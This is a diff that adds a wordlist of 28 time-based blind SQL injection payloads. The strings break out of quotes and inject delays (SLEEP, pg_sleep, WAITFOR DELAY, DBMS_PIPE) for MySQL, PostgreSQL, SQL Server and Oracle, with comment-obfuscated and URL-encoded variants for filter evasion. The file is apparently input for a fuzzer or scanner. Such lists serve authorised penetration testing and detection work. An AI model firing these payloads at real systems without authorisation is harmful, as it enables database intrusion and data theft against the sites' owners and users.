@@ -1,0 +1,28 @@
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+" AND SLEEP(5)--
+` AND SLEEP(5)--
+') AND SLEEP(5)--
+")) AND SLEEP(5)--
+' AND pg_sleep(5)--
+" AND pg_sleep(5)--
+';SELECT pg_sleep(5)--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99),5)--
+' WAITFOR DELAY '0:0:5'--
+"; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+" AND (SELECT * FROM (SELECT(SLEEP(5)))b)--
+1' AND SLEEP(5) AND '1'='1
+1" AND SLEEP(5) AND "1"="1
+' OR SLEEP(5)--
+' OR pg_sleep(5)--
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0"XOR(if(now()=sysdate(),sleep(5),0))XOR"Z
+'||(SELECT 0x414243 WHERE 1=1 AND SLEEP(5))||'
+(SELECT * FROM (SELECT(SLEEP(5)))YYYY)
+/**/AND/**/SLEEP(5)--
+'/**/AND/**/SLEEP(5)--
+%27%20AND%20SLEEP(5)--%20
+%22%20AND%20SLEEP(5)--%20
+' AND SLEEP(5)=0 LIMIT 1--
